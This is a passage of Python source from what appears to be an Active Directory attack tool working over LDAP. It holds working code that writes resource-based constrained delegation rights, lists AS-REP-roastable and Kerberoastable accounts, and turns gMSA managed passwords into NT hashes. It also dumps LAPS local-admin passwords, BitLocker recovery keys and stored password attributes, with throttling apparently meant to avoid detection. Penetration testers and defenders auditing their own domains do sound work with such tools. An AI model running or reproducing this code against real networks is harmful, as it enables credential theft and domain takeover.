		sddlStr = "O:S-1-5-32-544D:(A;;GA;;;%s)" % (sid) # GENERIC_ALL for object1 on "msDS-AllowedToActOnBehalfOfOtherIdentity"
		sd = SECURITY_DESCRIPTOR.from_sddl(sddlStr)
		sdBytes = sd.to_bytes()
		res = writeBytes(conn, dns[0], "msDS-AllowedToActOnBehalfOfOtherIdentity", sdBytes)
		if res['result'] == 0:
			print(f"[+] RBCD successfully edited for '{object1}' on '{object2}'")
		else:
			print(f"[-] Failed to edit '{object2}' attribute: {res}", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

###############################################################
#                     userAccountControl                      #
###############################################################

# https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties
USER_ACCOUNT_CONTROL_MASK = {
	"SCRIPT": 0x00000001,
	"ACCOUNTDISABLE": 0x00000002,
	"HOMEDIR_REQUIRED": 0x00000008,
	"LOCKOUT": 0x00000010,
	"PASSWD_NOTREQD": 0x00000020,
	"PASSWD_CANT_CHANGE": 0x00000040,
	"ENCRYPTED_TEXT_PWD_ALLOWED": 0x00000080,
	"TEMP_DUPLICATE_ACCOUNT": 0x00000100,
	"NORMAL_ACCOUNT": 0x00000200,
	"INTERDOMAIN_TRUST_ACCOUNT": 0x00000800,
	"WORKSTATION_TRUST_ACCOUNT": 0x00001000,
	"SERVER_TRUST_ACCOUNT": 0x00002000,
	"DONT_EXPIRE_PASSWORD": 0x00010000,
	"MNS_LOGON_ACCOUNT": 0x00020000,
	"SMARTCARD_REQUIRED": 0x00040000,
	"TRUSTED_FOR_DELEGATION": 0x00080000,
	"NOT_DELEGATED": 0x00100000,
	"USE_DES_KEY_ONLY": 0x00200000,
	"DONT_REQ_PREAUTH": 0x00400000,
	"PASSWORD_EXPIRED": 0x00800000,
	"TRUSTED_TO_AUTH_FOR_DELEGATION": 0x01000000,
	"PARTIAL_SECRETS_ACCOUNT": 0x04000000
}
USER_ACCOUNT_CONTROL_MASK_INV = {v: k for k, v in USER_ACCOUNT_CONTROL_MASK.items()}

def parseUserAccountControl(uacVal):
	print_yellow("[*] Parsing userAccountControl")
	print_yellow("---")
	print()

	try:
		uacStr = "|".join([string for value, string in USER_ACCOUNT_CONTROL_MASK_INV.items() if value & uacVal])

		print(f"[+] userAccountControl = {uacStr}")

		return uacStr
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def buildUserAccountControl(uacStr):
	print_yellow("[*] Building userAccountControl")
	print_yellow("---")
	print()

	try:
		properties = uacStr.split("|")
		uacVal = 0
		for property in properties:
			uacVal += USER_ACCOUNT_CONTROL_MASK[property]

		print(f"[+] userAccountControl = {str(uacVal)}")

		return str(uacVal)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

##############################################################
#                     Groups Membership                      #
##############################################################

def print_nested_dict(d, indent = 0):
	for key, value in d.items():
		if isinstance(value, dict):
			print('\t' * indent + "[+] " + str(key))
			print_nested_dict(value, indent + 1)
		elif isinstance(value, list):
			print('\t' * indent + "[+] " + str(key))
			for item in value:
				if isinstance(item, dict):
					print_nested_dict(item, indent + 1)
				else:
					print('\t' * (indent + 1) + "[+] " + str(item))
		else:
			pass

def getMembers(conn, server, objects):
	maybeSleep()
	res = {}
	for object in objects:
		if isinstance(object, bytes):
			object = object.decode()
		escaped_object = escape_filter_chars(object)
		filter = f"(|(samAccountName={escaped_object})(name={escaped_object})(distinguishedName={escaped_object}))"
		entry_generator = search(conn, server, filter = filter, attributes = ["member", "distinguishedName", "samAccountName"])
		for entry in entry_generator:
			if entry["type"] == "searchResEntry":
				sam = entry["raw_attributes"]["samAccountName"]
				if (len(sam) > 0):
					object = sam[0].decode()
				res[object] = []
				members = entry["raw_attributes"]["member"]
				dn = entry["raw_attributes"]["distinguishedName"][0].decode()
				if (len(members) != 0):
					for member in members:
						res[object] += [getMembers(conn, server, [member])]
				entry_generator = search(conn, server, baseDN = dn, attributes = ["objectClass", "distinguishedName", "samAccountName"])
				for entry in entry_generator:
					if entry["type"] == "searchResEntry":
						subDN = entry["raw_attributes"]["distinguishedName"]
						if subDN != []:
							subDN = subDN[0].decode()
						else:
							subDN = dn
						if (subDN != dn):
							objClass = entry["raw_attributes"]["objectClass"]
							if (b"user" in objClass or b"computer" in objClass):
								sam = entry["raw_attributes"]["samAccountName"]
								if (len(sam) > 0):
									res[object] += [sam[0].decode()]
								else:
									res[object] += [subDN]
							elif (b"group" in objClass or b"organizationalUnit" in objClass):
								res[object] += [getMembers(conn, server, [subDN])]

	return res

WELL_KNOWNS_DOMAIN_GROUP_RIDS = {
	512: "Domain Admins",
	513: "Domain Users",
	514: "Domain Guests",
	515: "Domain Computers",
	516: "Domain Controllers",
	517: "Cert Publishers",
	518: "Schema Admins",
	519: "Enterprise Admins",
	520: "Group Policy Creator Owners",
	521: "Read-only Domain Controllers",
	522: "Clonable Controllers",
	525: "Protected Users",
	526: "Key Admins",
	527: "Enterprise Key Admins"
}

def getMemberOfs(conn, server, objects):
	maybeSleep()
	res = {}
	for object in objects:
		if isinstance(object, bytes):
			object = object.decode()
		escaped_object = escape_filter_chars(object)
		filter = f"(|(samAccountName={escaped_object})(name={escaped_object})(distinguishedName={escaped_object}))"
		entry_generator = search(conn, server, filter = filter, attributes = ["memberOf", "primaryGroupID", "distinguishedName", "samAccountName"])
		for entry in entry_generator:
			if entry["type"] == "searchResEntry":
				sam = entry["raw_attributes"]["samAccountName"]
				if (len(sam) > 0):
					object = sam[0].decode()
				res[object] = []
				memberOfs = entry["raw_attributes"]["memberOf"]
				ids = entry["raw_attributes"]["primaryGroupID"]
				dn = entry["raw_attributes"]["distinguishedName"][0].decode()
				primaryGroupNames = []
				if ids != []:
					ids = entry["raw_attributes"]["primaryGroupID"]
					for id in ids:
						id = int(id.decode())
						name = WELL_KNOWNS_DOMAIN_GROUP_RIDS[id]
						primaryGroupNames += [name]
					res[object] += primaryGroupNames
				if (len(memberOfs) != 0):
					for memberOf in memberOfs:
						res[object] += [getMemberOfs(conn, server, [memberOf])]
				topDN = dn
				while (len(topDN.split(",")[1:]) > 2):
					topDN = ",".join(topDN.split(",")[1:])
					escaped_object = escape_filter_chars(topDN)
					entry_generator = search(conn, server, baseDN = topDN, filter = f"(distinguishedName={escaped_object})", attributes = ["objectClass"])
					for entry in entry_generator:
						if entry["type"] == "searchResEntry":
							objClass = entry["raw_attributes"]["objectClass"]
							if (b"group" in objClass or b"organizationalUnit" in objClass):
								res[object] += [getMemberOfs(conn, server, [topDN])]

	return res

def listMembers(conn, server, objects):
	print_yellow("[*] Recursively listing members of the provided AD objects")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		members = getMembers(conn, server, objects)
		if (len(members) == 0):
			print("[-] Provided AD objects does not exist", file = sys.stderr)
		else:
			print_nested_dict(members)

		return members
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def listMemberOfs(conn, server, objects):
	print_yellow("[*] Recursively listing groups/OUs of the provided AD objects")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		memberOfs = getMemberOfs(conn, server, objects)
		if (len(memberOfs) == 0):
			print("[-] Provided AD objects does not exist", file = sys.stderr)
		else:
			print_nested_dict(memberOfs)

		return memberOfs
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

########################################################################
#                     Kerberos Pre-Authentication                      #
########################################################################

def listKerbNoPreauth(conn, server):
	print_yellow("[*] Listing AD accounts without Kerberos Pre-Authentication")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		entry_generator = search(conn, server, attributes = ["distinguishedName", "userAccountControl"])
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				if (entry["raw_attributes"]["userAccountControl"] != []):
					uacVal = int(entry["raw_attributes"]["userAccountControl"][0])
					dn = entry["raw_attributes"]["distinguishedName"][0].decode()
					if USER_ACCOUNT_CONTROL_MASK["DONT_REQ_PREAUTH"] & uacVal:
						nbentries += 1
						print("[+] '{}' configured without Kerberos Pre-Authentication".format(dn))

		if nbentries == 0:
			print("[-] All AD accounts have Kerberos Pre-Authentication configured", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

###########################################################
#                     Kerberoastable                      #
###########################################################

def listKerberoastable(conn, server):
	print_yellow("[*] Listing AD users with SPN(s)")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		entry_generator = search(conn, server, filter = "(&(servicePrincipalName=*)(sAMAccountType=805306368))", attributes = ["samAccountName", "servicePrincipalName"])
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				nbentries += 1
				print("[+] {}".format(entry["raw_attributes"]["samAccountName"][0].decode()))
				for spn in entry["raw_attributes"]["servicePrincipalName"]:
					print("\t[+] {}".format(spn.decode()))
		
		if nbentries == 0:
			print("[-] No AD users with SPN(s)", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

###########################################################################
#                     Default Domain Password Policy                      #
###########################################################################

def windowsFileTimeToTimedelta(fileTimeStr):
	fileTime = int(fileTimeStr)
	if fileTime == 0 or fileTime == -0x8000000000000000:
		return 'Never'
	
	seconds = -fileTime / 10_000_000
	return str(datetime.timedelta(seconds = seconds))

def getDefaultDomainPwdPolicy(conn, server):
	print_yellow("[*] Getting Default Domain Password Policy")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		entry_generator = search(conn, server, filter = "(objectClass=domainDNS)", attributes = ["lockoutThreshold", "lockoutDuration", "lockoutObservationWindow",
																										"maxPwdAge", "minPwdAge", "minPwdLength", "pwdHistoryLength", "pwdProperties"])
		for entry in entry_generator:
			if entry["type"] == "searchResEntry":
				print("[+] Default Domain Password Policy")
				print("\t[+] Lockout Threshold = {}".format(entry["raw_attributes"]["lockoutThreshold"][0].decode()))
				print("\t[+] Lockout Duration = {}".format(windowsFileTimeToTimedelta(entry["raw_attributes"]["lockoutDuration"][0].decode())))
				print("\t[+] Lockout Observation Window = {}".format(windowsFileTimeToTimedelta(entry["raw_attributes"]["lockoutObservationWindow"][0].decode())))
				print("\t[+] Max Pwd Age = {}".format(windowsFileTimeToTimedelta(entry["raw_attributes"]["maxPwdAge"][0].decode())))
				print("\t[+] Min Pwd Age = {}".format(windowsFileTimeToTimedelta(entry["raw_attributes"]["minPwdAge"][0].decode())))
				print("\t[+] Min Pwd Length = {}".format(int(entry["raw_attributes"]["minPwdLength"][0].decode())))
				print("\t[+] Pwd History Length = {}".format(int(entry["raw_attributes"]["pwdHistoryLength"][0].decode())))
				pwdProperties = int(entry["raw_attributes"]["pwdProperties"][0].decode())
				print("\t[+] Pwd Properties = {}".format(pwdProperties)) # https://ldapwiki.com/wiki/Wiki.jsp?page=PwdProperties
				print("\t\t[+] Domain Password Complexity = {}".format((pwdProperties & 1) != 0))
				print("\t\t[+] Domain Password No Anon Change = {}".format((pwdProperties & 2) != 0))
				print("\t\t[+] Domain Lockout Admins = {}".format((pwdProperties & 8) != 0))
				print("\t\t[+] Domain Password Store Cleartext = {}".format((pwdProperties & 16) != 0))
				print("\t\t[+] Domain Refuse Password Change = {}".format((pwdProperties & 32) != 0))
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def listPSO(conn, server, resolvePSOAppliesTo):
	print_yellow("[*] Listing PSO")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		entry_generator = search(conn, server, filter = "(objectClass=msDS-PasswordSettings)", attributes = ["cn", "msDS-PSOAppliesTo", "msDS-MaximumPasswordAge",
																									"msDS-MinimumPasswordAge", "msDS-MinimumPasswordLength", "msDS-PasswordHistoryLength",
																									"msDS-PasswordComplexityEnabled", "msDS-PasswordReversibleEncryptionEnabled", "msDS-LockoutObservationWindow",
																									"msDS-LockoutDuration", "msDS-LockoutThreshold", "msDS-PasswordSettingsPrecedence"])
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				nbentries += 1
				cn = entry["raw_attributes"]["cn"][0].decode()
				print(f"[+] PSO = {cn}")
				print("\t[+] Lockout Threshold = {}".format(entry["raw_attributes"]["msDS-LockoutThreshold"][0].decode()))
				print("\t[+] Lockout Duration = {}".format(windowsFileTimeToTimedelta(entry["raw_attributes"]["msDS-LockoutDuration"][0].decode())))
				print("\t[+] Lockout Observation Window = {}".format(windowsFileTimeToTimedelta(entry["raw_attributes"]["msDS-LockoutObservationWindow"][0].decode())))
				print("\t[+] Max Pwd Age = {}".format(windowsFileTimeToTimedelta(entry["raw_attributes"]["msDS-MaximumPasswordAge"][0].decode())))
				print("\t[+] Min Pwd Age = {}".format(windowsFileTimeToTimedelta(entry["raw_attributes"]["msDS-MinimumPasswordAge"][0].decode())))
				print("\t[+] Min Pwd Length = {}".format(int(entry["raw_attributes"]["msDS-MinimumPasswordLength"][0].decode())))
				print("\t[+] Pwd History Length = {}".format(int(entry["raw_attributes"]["msDS-PasswordHistoryLength"][0].decode())))
				print("\t[+] Password Complexity = {}".format("True" if entry["raw_attributes"]["msDS-PasswordComplexityEnabled"][0] == b"TRUE" else "False"))
				print("\t[+] Password Reversible Encryption = {}".format("True" if entry["raw_attributes"]["msDS-PasswordReversibleEncryptionEnabled"][0] == b"TRUE" else "False"))
				PSOAppliesTo = [x.decode() for x in entry["raw_attributes"]["msDS-PSOAppliesTo"]]
				print("\t[+] PSO targets")
				if resolvePSOAppliesTo:
					print("\t\t[+] Resolving recursively PSO targets members")
					members = getMembers(conn, server, PSOAppliesTo)
					if (len(members) == 0):
						print("\t\t[-] Failed to resolve recursively PSO target members. Displaying direct target members", file = sys.stderr)
						for applyTo in PSOAppliesTo:
							print(f"\t\t[+] {applyTo}")
					else:
						print_nested_dict(members, 2)
				else:
					for applyTo in PSOAppliesTo:
						print(f"\t\t[+] {applyTo}")

		if nbentries == 0:
			print("[-] No PSO configured or user does not have rights to read PSO", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

##################################################################################
#                     Group Managed Service Accounts (gMSA)                      #
##################################################################################

# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e
class MSDS_MANAGEDPASSWORD_BLOB:
	def __init__(self):
		self.Version = None
		self.Reserved = None
		self.Length = None
		self.CurrentPasswordOffset = None
		self.PreviousPasswordOffset = None
		self.QueryPasswordIntervalOffset = None
		self.UnchangedPasswordIntervalOffset = None
		self.CurrentPassword = None
		self.PreviousPassword = None
		self.QueryPasswordInterval = None
		self.UnchangedPasswordInterval = None

	@staticmethod
	def from_bytes(data):
		format_string = '<HHIHHHH'
		size = struct.calcsize(format_string)
		fields = struct.unpack(format_string, data[:size])

		blob = MSDS_MANAGEDPASSWORD_BLOB()
		blob.Version = fields[0]
		blob.Reserved = fields[1]
		blob.Length = fields[2]
		blob.CurrentPasswordOffset = fields[3]
		blob.PreviousPasswordOffset = fields[4]
		blob.QueryPasswordIntervalOffset = fields[5]
		blob.UnchangedPasswordIntervalOffset = fields[6]

		if blob.PreviousPasswordOffset == 0:
			endData = blob.QueryPasswordIntervalOffset
		else:
			endData = blob.PreviousPasswordOffset

		current_password_size = endData - blob.CurrentPasswordOffset - 2
		blob.CurrentPassword = data[blob.CurrentPasswordOffset:blob.CurrentPasswordOffset + current_password_size]

		if blob.PreviousPasswordOffset != 0:
			previous_password_size = blob.QueryPasswordIntervalOffset - blob.PreviousPasswordOffset
			blob.PreviousPassword = data[blob.PreviousPasswordOffset:blob.PreviousPasswordOffset + previous_password_size]

		query_password_interval_size = blob.UnchangedPasswordIntervalOffset - blob.QueryPasswordIntervalOffset
		blob.QueryPasswordInterval = data[blob.QueryPasswordIntervalOffset:blob.QueryPasswordIntervalOffset + query_password_interval_size]

		blob.UnchangedPasswordInterval = data[blob.UnchangedPasswordIntervalOffset:]

		return blob

# https://github.com/Semperis/GoldenGMSA/blob/main/GoldenGMSA/MsdsManagedPasswordId.cs
class MSDS_MANAGEDPASSWORD_ID:
	def __init__(self):
		self.Version = None
		self.Reserved = None
		self.IsPublicKey = None
		self.L0Index = None
		self.L1Index = None
		self.L2Index = None
		self.RootKeyIdentifier = None
		self.cbUnknown = None
		self.cbDomainName = None
		self.cbForestName = None
		self.Unknown = None
		self.DomainName = None
		self.ForestName = None

	@staticmethod
	def from_bytes(data):
		format_string = '<IIIIII16sIII'
		size = struct.calcsize(format_string)
		fields = struct.unpack(format_string, data[:size])

		ManagedPasswordId = MSDS_MANAGEDPASSWORD_ID()
		ManagedPasswordId.Version = fields[0]
		ManagedPasswordId.Reserved = fields[1]
		ManagedPasswordId.IsPublicKey = fields[2]
		ManagedPasswordId.L0Index = fields[3]
		ManagedPasswordId.L1Index = fields[4]
		ManagedPasswordId.L2Index = fields[5]
		ManagedPasswordId.RootKeyIdentifier = GUID.from_bytes(fields[6])
		ManagedPasswordId.cbUnknown = fields[7]
		ManagedPasswordId.cbDomainName = fields[8]
		ManagedPasswordId.cbForestName = fields[9]

		if ManagedPasswordId.cbUnknown > 0:
			ManagedPasswordId.Unknown = data[size : size + ManagedPasswordId.cbUnknown]
		else:
			ManagedPasswordId.Unknown = None

		domain_name_start = size + ManagedPasswordId.cbUnknown
		domain_name_end = domain_name_start + ManagedPasswordId.cbDomainName
		ManagedPasswordId.DomainName = data[domain_name_start:domain_name_end].decode("utf-16-le")

		forest_name_start = domain_name_end
		forest_name_end = forest_name_start + ManagedPasswordId.cbForestName
		ManagedPasswordId.ForestName = data[forest_name_start:forest_name_end].decode("utf-16-le")

		return ManagedPasswordId

def listGMSA(conn, server):
	print_yellow("[*] Listing gMSA accounts")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		entry_generator = search(conn, server, attributes = ["sAMAccountName", "msDS-ManagedPassword", "msDS-ManagedPasswordId", "msDS-ManagedPasswordInterval", "msDS-GroupMSAMembership"])
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				if entry["raw_attributes"]["msDS-ManagedPasswordId"] != []:
					nbentries += 1
					print("[+] Found gMSA account = {}".format(entry["raw_attributes"]["sAMAccountName"][0].decode()))
					if entry["raw_attributes"]["msDS-ManagedPassword"] != []:
						ManagedPasswordBlob = MSDS_MANAGEDPASSWORD_BLOB.from_bytes(entry["raw_attributes"]["msDS-ManagedPassword"][0])
						ManagedPassword = ManagedPasswordBlob.CurrentPassword
						ManagedPasswordNT = hashlib.new ("md4", ManagedPassword).hexdigest()
						# print("\t[+] Managed Password Hex = {}".format(binascii.hexlify(ManagedPassword).decode()))
						print("\t[+] Managed Password NT = {}".format(ManagedPasswordNT))
					else:
						print("\t[-] Current user cannot read msDS-ManagedPassword attribute of gMSA account")

					ManagedPasswordId = MSDS_MANAGEDPASSWORD_ID.from_bytes(entry["raw_attributes"]["msDS-ManagedPasswordId"][0])
					print("\t[+] Managed Password Id")
					print("\t\t[+] Root Key Identifier = {}".format(ManagedPasswordId.RootKeyIdentifier))
					print("\t\t[+] Domain Name = {}".format(ManagedPasswordId.DomainName))
					print("\t\t[+] Forest Name = {}".format(ManagedPasswordId.ForestName))

					if entry["raw_attributes"]["msDS-ManagedPasswordInterval"] != []:
						print("\t[+] Managed Password Interval = {} day(s)".format(entry["raw_attributes"]["msDS-ManagedPasswordInterval"][0].decode()))

					if entry["raw_attributes"]["msDS-GroupMSAMembership"] != []:
						sd = SECURITY_DESCRIPTOR.from_bytes(entry["raw_attributes"]["msDS-GroupMSAMembership"][0])
						sddl = sd.to_sddl()
						print("\t[+] gMSA Membership SDDL = {}".format(sddl))

		if nbentries == 0:
			print("[-] No LDAP encrypted connection used and/or no gMSA accounts", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

#################################################################################
#                     Local Admin Password Solution (LAPS)                      #
#################################################################################

def windows_timestamp_to_date(timestamp):
	# Windows Filetime epoch starts on January 1, 1601
	windows_epoch = datetime.datetime(1601, 1, 1, 0, 0, 0)

	# Convert 100-nanosecond intervals to seconds
	seconds = timestamp / 10**7

	# Add the seconds to the Windows epoch
	date = windows_epoch + datetime.timedelta(seconds=seconds)

	# Return a formatted date string
	return date.strftime("%d/%m/%Y %H:%M:%S %p")

def listLAPS(conn, server):
	print_yellow("[*] Listing LA pwds managed by LAPS")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		entry_generator = search(conn, server, attributes = ["sAMAccountName", "ms-Mcs-AdmPwd", "ms-Mcs-AdmPwdExpirationTime"])
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				if entry["raw_attributes"]["ms-Mcs-AdmPwd"] != []:
					nbentries += 1
					pwd = entry["raw_attributes"]["ms-Mcs-AdmPwd"][0].decode()
					timestamp = int(entry["raw_attributes"]["ms-Mcs-AdmPwdExpirationTime"][0])
					date = windows_timestamp_to_date(timestamp)
					print("[+] Found LA pwd for computer '{}' = {} (Expiration date = {})".format(entry["raw_attributes"]["sAMAccountName"][0].decode(), pwd, date))

		if nbentries == 0:
			print("[-] No managed LA pwds by LAPS and/or user does not have rights to read pwds", file = sys.stderr)
	except LDAPAttributeError:
		print("[-] LAPS not installed on the domain", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

######################################################
#                     Bitlocker                      #
######################################################

def listBitlocker(conn, server):
	print_yellow("[*] Listing Bitlocker Recovery Keys")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		entry_generator = search(conn, server, attributes = ["distinguishedName", "msFVE-RecoveryPassword"])
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				if entry["raw_attributes"]["msFVE-RecoveryPassword"] != []:
					nbentries += 1
					pwd = entry["raw_attributes"]["msFVE-RecoveryPassword"][0].decode()
					print("[+] Found Bitlocker Recovery Key for computer '{}' = {}".format(entry["raw_attributes"]["distinguishedName"][0].decode(), pwd,))

		if nbentries == 0:
			print("[-] No Bitlocker Recovery Keys and/or user does not have rights to read keys", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

###########################################################
#                     LDAP Passwords                      #
###########################################################

def listDesc(conn, server, filters = None):
	print_yellow("[*] Listing AD accounts' description attributes")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		if (filters != None):
			print("[+] Filtering with keywords: {}".format(filters))

		entry_generator = search(conn, server, filter = "(objectClass=user)", attributes = ["samAccountName", "description"])
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				desc = entry["raw_attributes"]["description"]
				sam = entry["raw_attributes"]["samAccountName"][0].decode()
				if desc != []:
					nbentries += 1
					desc = desc[0].decode()
					if (filters != None):
						display = False
						for filter in filters:
							if filter in desc:
								display = True
						if (display):
							print("[+] {}: {}".format(sam, desc))
					else:
						print("[+] {}: {}".format(sam, desc))
		
		if nbentries == 0:
			print("[-] No AD accounts with description attribute", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def listPwdsAttr(conn, server):
	print_yellow("[*] Listing attributes with passwords")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		nbentries = 0
		global PAGED_SIZE

		try:
			entry_generator = search(conn, server, filter = "(userPassword=*)",
							attributes = ["samAccountName", "description", "userPassword"])
			i = 0
			for entry in entry_generator:
				i += 1
				if (i % PAGED_SIZE == 0):
					maybeSleep()
				if entry["type"] == "searchResEntry":
					nbentries += 1

					sam = entry["raw_attributes"]["samAccountName"][0].decode()
					description = entry["raw_attributes"]["description"]
					if description != []:
						description = description[0].decode()
					else:
						description = "<None>"

					# UTF-8 format. Allow AD domain authentication
					# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f3adda9f-89e1-4340-a3f2-1f0a6249f1f8
					userPassword = entry["raw_attributes"]["userPassword"][0]
					print(f"[+] Found '{sam}'")
					print(f"\t[+] Description = {description}")
					print("\t[+] userPassword = {}".format(userPassword))
		except Exception as e:
			if str(e).find('invalid attribute type') != -1:
				pass
			else:
				raise

		try:
			entry_generator = search(conn, server, filter = "(unicodePwd=*)",
							attributes = ["samAccountName", "description", "unicodePwd"])
			i = 0
			for entry in entry_generator:
				i += 1
				if (i % PAGED_SIZE == 0):
					maybeSleep()
				if entry["type"] == "searchResEntry":
					nbentries += 1
					
					sam = entry["raw_attributes"]["samAccountName"][0].decode()
					description = entry["raw_attributes"]["description"]
					if description != []:
						description = description[0].decode()
					else:
						description = "<None>"
					
					# Similar to userPassword but used only by the operating system and has additional encoding requirements
					# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/71e64720-be27-463f-9cc5-117f4bc849e1
					unciodePwd = entry["raw_attributes"]["unicodePwd"][0]
					print(f"[+] Found '{sam}'")
					print(f"\t[+] Description = {description}")
					print("\t[+] unciodePwd = {}".format(unciodePwd))
		except Exception as e:
			if str(e).find('invalid attribute type') != -1:
				pass
			else:
				raise

		try:
			entry_generator = search(conn, server, filter = "(unixUserPassword=*)",
							attributes = ["samAccountName", "description", "unixUserPassword"])
			i = 0
			for entry in entry_generator:
				i += 1
				if (i % PAGED_SIZE == 0):
					maybeSleep()
				if entry["type"] == "searchResEntry":
					nbentries += 1
					
					sam = entry["raw_attributes"]["samAccountName"][0].decode()
					description = entry["raw_attributes"]["description"]
					if description != []:
						description = description[0].decode()
					else:
						description = "<None>"
					
					# User password that is compatible with UNIX systems
					# https://learn.microsoft.com/en-us/windows/win32/adschema/a-unixuserpassword
					unixUserPassword = entry["raw_attributes"]["unixUserPassword"][0]
					print(f"[+] Found '{sam}'")
					print(f"\t[+] Description = {description}")
					print("\t[+] unixUserPassword = {}".format(unixUserPassword))
		except Exception as e:
			if str(e).find('invalid attribute type') != -1:
				pass
			else:
				raise
	
		try:
			entry_generator = search(conn, server, filter = "(msSFU30Password=*)",
							attributes = ["samAccountName", "description", "msSFU30Password"])
			i = 0
			for entry in entry_generator:
				i += 1
				if (i % PAGED_SIZE == 0):
					maybeSleep()
				if entry["type"] == "searchResEntry":
					nbentries += 1
					
					sam = entry["raw_attributes"]["samAccountName"][0].decode()
					description = entry["raw_attributes"]["description"]
					if description != []:
						description = description[0].decode()
					else:
						description = "<None>"
					
					# Specifies a msSFU30Password compatible with UNIX systems. Replaced by unixUserPassword
					# https://www.linuxexam.net/2019/07/windows-active-directory-step-by-step-7.html
					# https://www.ibm.com/docs/en/aix/7.1?topic=servers-active-directory-password-attribute-selection
					msSFU30Password = entry["raw_attributes"]["msSFU30Password"][0]
					print(f"[+] Found '{sam}'")
					print(f"\t[+] Description = {description}")
					print("\t[+] msSFU30Password = {}".format(msSFU30Password))	
